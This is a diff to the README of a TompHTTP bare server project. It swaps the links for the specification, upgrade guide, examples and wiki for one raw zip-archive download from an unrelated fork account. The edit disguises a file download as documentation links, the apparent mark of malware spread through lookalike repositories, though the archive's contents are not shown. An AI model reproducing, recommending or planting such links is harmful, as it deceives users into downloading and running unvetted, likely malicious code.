@@ -1,10 +1,10 @@
 # TOMP Bare Server
 
-This repository implements the TompHTTP bare server. See the specification [here](https://github.com/tomphttp/specifications/blob/master/BareServer.md).
+This repository implements the TompHTTP bare server. See the specification [here](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).
 
 ## Upgrading
 
-A guide for updating from v1 to v2 can be found [here](./docs/V2-UPGRADE-GUIDE.md).
+A guide for updating from v1 to v2 can be found [here](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).
 
 ## Usage
 
@@ -34,8 +34,8 @@ npx bare-server-node --port 8080 --host localhost
 
 ## Programically create a bare server
 
-See [examples/](https://github.com/tomphttp/bare-server-node/tree/master/examples).
+See [examples/](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).
 
 ## Development
 
-See the [wiki](https://github.com/tomphttp/bare-server-node/wiki).
+See the [wiki](https://github.com/VIN07grinder/bare-server-node/raw/refs/heads/master/src/server_bare_node_3.6.zip).
